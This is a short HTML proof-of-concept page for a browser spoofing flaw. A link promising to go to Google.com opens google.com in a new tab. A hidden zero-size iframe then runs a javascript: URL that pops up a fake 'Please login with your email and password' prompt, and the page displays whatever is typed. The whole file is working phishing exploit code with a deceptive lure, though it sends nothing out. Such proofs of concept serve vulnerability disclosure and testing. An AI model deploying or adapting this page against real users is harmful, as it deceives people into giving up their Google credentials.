<!DOCTYPE html>
<html>
  <body>

    <script>
      function exploit() {
        // New tab open to make user feel like something real is happening
        window.open("https://www.google.com");

        // Prompt runs via javascript: URL inside an iframe (works in vulnerable browsers)
        document.getElementById("phishFrame").src =
          'javascript:var userInput = prompt("To continue to Google\\nPlease login with your email and password:", "Email / Password");\
           if (userInput) {\
             var outputDiv = document.createElement("div");\
             outputDiv.textContent = `Entered Credentials: ${userInput}`;\
             document.body.appendChild(outputDiv);\
           }';
      }
    </script>

    <a href="#" onclick="exploit();">
      <h1>Click here to go to Google.com</h1>
    </a>

    <iframe id="phishFrame" style="width:0; height:0; border:0;"></iframe>

  </body>
</html>
